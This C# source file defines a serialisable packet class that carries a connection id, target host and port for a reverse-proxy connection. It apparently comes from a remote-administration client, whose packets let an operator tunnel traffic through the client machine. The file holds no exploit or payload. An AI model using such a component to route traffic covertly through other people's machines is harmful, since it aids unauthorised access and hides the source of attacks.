using ProtoBuf;
using xClient.Core.Packets;

namespace xClient.Core.ReverseProxy.Packets
{
    [ProtoContract]
    public class ReverseProxyConnect : IPacket
    {
        [ProtoMember(1)]
        public int ConnectionId { get; set; }

        [ProtoMember(2)]
        public string Target { get; set; }

        [ProtoMember(3)]
        public int Port { get; set; }

        public ReverseProxyConnect()
        {
        }

        public ReverseProxyConnect(int connectionId, string target, int port)
        {
            this.ConnectionId = connectionId;
            this.Target = target;
            this.Port = port;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
